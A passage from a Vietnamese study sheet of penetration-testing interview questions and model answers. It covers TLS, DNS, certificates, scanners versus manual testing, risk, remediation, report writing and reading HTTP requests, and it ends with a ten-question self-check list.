Đáp án. Có. HTTPS sử dụng TLS để bảo vệ dữ liệu trên đường truyền và xác thực server theo certificate model.

Câu 257. Bạn nói “DNS”. DNS có phải chỉ map domain sang IP không?
Đáp án. Không. DNS có nhiều loại record phục vụ nhiều mục đích khác nhau như mail, alias, verification và service discovery.

Câu 258. Bạn nói “SSL/TLS”. Certificate dùng để làm gì?
Đáp án. Certificate chứa identity information và public key của subject, được CA chain xác thực theo trust model.

Câu 259. Bạn nói “OWASP ZAP”. Vì sao biết nhiều tool?
Đáp án. Mục tiêu không phải nhớ nhiều tool mà hiểu workflow và chọn tool phù hợp với bài toán.

Câu 260. Bạn nói “Nessus”. Scanner có thay pentester được không?
Đáp án. Không. Scanner tốt cho discovery và known vulnerabilities; pentester cần manual validation, logic testing, exploitation có kiểm soát và impact analysis.

Câu 261. Bạn nói “70% labs”. Bạn nhớ tất cả payload không?
Đáp án. Không cần nhớ tất cả payload. Quan trọng hơn là hiểu root cause, context và cách tự xây hoặc tìm payload phù hợp.

Câu 262. Bạn nói “CTF Finalist”. Thành tích này chứng minh gì?
Đáp án. Nó cho thấy em có trải nghiệm làm challenge và phối hợp team, nhưng năng lực production vẫn phải được chứng minh bằng testing methodology và project thực tế.

Câu 263. Bạn nói “Technical Blog”. Viết blog có ích cho nghề Pentest không?
Đáp án. Có thể giúp hệ thống hóa kiến thức, lưu methodology và chứng minh khả năng technical communication.

Câu 264. Bạn nói “risk levels”. Severity và risk có giống nhau không?
Đáp án. Không hoàn toàn. Severity thường mô tả mức độ tác động kỹ thuật; risk thường kết hợp impact với likelihood và context.

Câu 265. Bạn nói “remediation”. Remediation khác mitigation thế nào?
Đáp án. Remediation hướng tới sửa nguyên nhân hoặc loại bỏ lỗi; mitigation giảm khả năng hoặc tác động khi chưa thể sửa triệt để.

Câu 266. Bạn nói “source code reading”. Có cần đọc toàn bộ source không?
Đáp án. Không. Nên trace các input, sink, authentication, authorization, data flow và các code path liên quan đến finding.

Câu 267. Bạn nói “Linux/Windows”. Khi pentest Windows bạn quan tâm gì?
Đáp án. Service, ports, authentication, domain context, file shares, permissions, local configuration và attack surface phù hợp scope.

Câu 268. Bạn nói “network infrastructure scanning”. Vì sao scan mạng trước Web?
Đáp án. Có thể giúp xác định service và exposure liên quan, nhưng thứ tự thực tế phụ thuộc scope và mục tiêu engagement.

Câu 269. Bạn nói “OWASP Top 10”. Có học OWASP là đủ để làm pentest không?
Đáp án. Không. Cần thêm HTTP, networking, programming, API, business logic, operating systems, tooling và kinh nghiệm manual testing.

Câu 270. Nếu interviewer đưa cho bạn một request, bạn phân tích gì đầu tiên?
Đáp án. Method, path, headers, cookies, authentication, parameters, content type và dữ liệu quan trọng trong body.

Câu 271. Nếu interviewer đưa một response, bạn nhìn gì trước?
Đáp án. Status code, headers, cookies, body, reflected input, error, data exposure, redirect và behavior khác thường.

Câu 272. Nếu interviewer yêu cầu viết report trong 10 phút?
Đáp án. Em tập trung vào title, affected endpoint, vulnerability, concise reproduction, evidence, impact và remediation.

Câu 273. Nếu không biết câu trả lời trong phỏng vấn?
Đáp án. Nói rõ phần mình biết, không bịa. Sau đó giải thích cách mình sẽ kiểm chứng hoặc tìm hiểu vấn đề.

Câu 274. Câu hỏi quan trọng nhất khi pentest là gì?
Đáp án. Vulnerability nằm ở đâu, điều kiện khai thác là gì, impact là gì, và làm thế nào để chứng minh bằng evidence an toàn.

Câu 275. Khi kết thúc một buổi pentest, bạn cần nhớ gì?
Đáp án. Không chỉ nhớ vulnerability. Hãy nhớ evidence, root cause, impact, affected scope, remediation và những gì cần retest.

============================================================
KẾT THÚC – 10 CÂU TỰ KIỂM TRA NHANH
============================================================

Một. Authentication khác Authorization thế nào?
Hai. IDOR thuộc vấn đề gì?
Ba. SQLi khác XSS ở đâu?
Bốn. SSRF xảy ra ở phía client hay server?
Năm. SSTI xảy ra ở đâu?
Sáu. Burp Repeater dùng để làm gì?
Bảy. Nmap chủ yếu dùng để làm gì?
Tám. Wireshark phân tích loại dữ liệu nào?
Chín. Tại sao prepared statements chống SQLi?
Mười. Một finding tốt cần có những gì?

Hết tập ôn.
